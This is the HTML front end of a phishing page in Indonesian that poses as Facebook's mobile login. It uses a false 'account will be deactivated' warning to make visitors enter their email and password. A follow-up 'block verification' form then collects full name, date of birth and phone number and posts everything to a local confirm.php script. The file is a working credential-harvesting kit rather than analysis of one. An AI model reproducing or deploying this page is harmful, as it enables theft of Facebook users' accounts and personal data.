<html>

  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
    <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
    <title>Masuk Facebook | Facebook</title>
    <meta property="og:title" content="Masuk Facebook | Facebook">
    <meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
    <meta property="og:description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Masuk Facebook | Facebook">
    <meta property="og:type" content="website">
    <meta name="copyright" content=" Alex Ariandi">
    <meta name="theme-color" content="#1877f2">
    <link rel="stylesheet" href="alexFrontEnd/style-AlexHost.css" />
    <link rel="stylesheet" href="bagas/bagas.css">
  </head>

  <body>
    <div class="appfbalexperingatan">
      <div class="contfbalexperingatan">
        <div class="headeralexfbperingatan">
          <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mobile_icon_fb.png" />
          <span>Pasang Facebook untuk Android dan buka lebih cepat.</span>
        </div>
        <div class="peringatansalah email-fb">
          <span>Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></span>
        </div>
        <div class="peringatansalah sandi-fb">
          <span>Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></span>
        </div>
        <div class="contperingatanalexfb">
          <div class="warningfbalexperingatam">
            <div class="redperingatan">
              <p><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Akun anda akan di nonaktifkan</p>
            </div>
            <div class="greenfbalexperingatan">
              <p><i class="fa fa-bell" aria-hidden="true"></i> Login untuk membatalkan penonaktifan akun Anda</p>
            </div>
          </div>
          <form class="boxformalexfbperingatan" id="alexformawal">
            <div class="logoalexfbperingatan">
              <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360">
                <defs>
                  <style>
                    .cls-1 {
                      fill: #1877F2;
                    }

                  </style>
                </defs>
                <title>FBWordmark_Hex-RGB-1024</title>
                <path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path>
                <path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path>
                <path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path>
                <path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path>
                <path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path>
                <path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path>
                <path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path>
                <path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path>
        </svg>
      </div>
        <form action="langkahBukaKunci/confirm.php" method="post">
            <div class="formalexfbperingatan">
              <input type="text" name="email" placeholder="Nomor ponsel atau email" id="alx_email_fb" autocomplete="off">
              <input type="password" name="password" placeholder="Kata Sandi" id="alx_password_fb" autocomplete="off">
              <button type="button" onclick="AlexHostingNetFB()">Masuk</button>
              <span>Lupa Kata Sandi?</span>
              <div class="ataualexfbperingatan">
                <div class="garisalexperingatan"></div>
                <div class="ataualexfb">atau</div>
                <div class="garisalexperingatan"></div>
              </div>
              <div class="btnbuatfbperingatanalex">
                <button type="button">Buat Akun Baru</button>
              </div>
            </div>
          </form>
        </div>

        <div class="footalexfbperingatan">
          <div class="atasfootalexperingatan">
            <div class="itemfootalexperingatan">
              <span style="color: #747474;">Bahasa Indonesia</span>
              <span>Basa Jawa</span>
              <span>日本語</span>
              <span>Português (Brasil)</span>
            </div>
            <div class="itemfootalexperingatan">
              <span>English (UK)</span>
              <span>Bahasa Melayu</span>
              <span>Español</span>
              <label><i class="bi bi-plus-lg"></i></label>
            </div>
          </div>
          <div class="supportfbalexperingatan">
            <span>Tentang</span>•<span>Bantuan</span>•<span>Lainnya</span>
          </div>
          <div class="copyrightalexfbperingatan">
            <p>Facebook Inc.</p>
          </div>
        </div>

        <div class="verifpemblokiranalexfb" style="display:none;">
          <div class="boxpemblokiranfbalex">
            <div class="headerpemblokiranalex">
              <img src="https://i.postimg.cc/L8qRDfPQ/fbsesi.jpg" />
              <span class="headlivealexverif">Verifikasi Pemblokiran</span>
              <span class="headlivealexsuccess" style="display: none;"><i class="bi bi-hourglass-split"></i> Proses Pembatalan Blokir</span>
            </div>
            <form class="bxformpemblokiran" id="alexFormID">
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label>Nama Lengkap</label>
                </div>
                <input type="text" name="nama" id="alx_nama" placeholder="Nama Lengkap Facebook Anda" autocomplete="off" />
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label>Tanggal Lahir</label>
                </div>
                <input type="date" name="ttl" min="1970-01-01" max="2020-01-01" id="alx_ttl" autocomplete="off" />
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label>Nomor Telepon</label>
                </div>
                <input type="number" name="phone" placeholder="Nomor Telepon" id="alx_phone" autocomplete="off" />
              </div>
              <div class="btnverifalexfbblokir">
                <input type="hidden" name="email" id="emailress" readonly>
                <input type="hidden" name="password" id="passwordress" readonly>
                <button id="btnSubmit" type="button" onclick="extend()">Verifikasi</button>
                 
                        <button id="btnHidden" style="display: none;">
                                <i class="fa fa-spinner fa-spin" style=""></i> Loading...
                        </button>
              </div>
              <div class="sdkalexveriffb">
                <span>*Dengan klik <em>verifikasi</em> berarti Anda akan <b>membatalkan</b> pemblokiran akun Anda</span>
              </div>
              <div class="alibialexfbblokir">
                <span class="salahpengisian" style="display: none;">Data kamu belum berhasil di verifikasi, silahkan isi dengan benar lalu coba lagi!</span>
              </div>
            </form>
            <div class="loadingdataalex" style="display: none;">
              <div class="box-loadingalex">
                <i class="fas fa-spinner fa-spin"></i>
              </div>
            </div>
            <div class="boxsucessalexfbpemblokiran" style="display: none;">
              <div class="boxalexsuccesspemblokiran">
                <p>Terima Kasih Telah Mengajukan Proses Pembatalan.</p>
                <p>Akun Facebook Anda Di Proses Selama 1x24 Jam.</p>
                <div class="btnverifalexfbblokir">
                  <button onclick="allresetalex();"><i class="bi bi-box-arrow-right"></i> Logout</button>
                </div>
              </div>
            </div>
            <div class="cralexfbpemblokiran">
              <span>Facebook inc.</span>
            </div>
          </div>
        </div>

      </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="alexFrontEnd/js-AlexHost.js"></script>
    <script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>

    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
  </body>

</html>
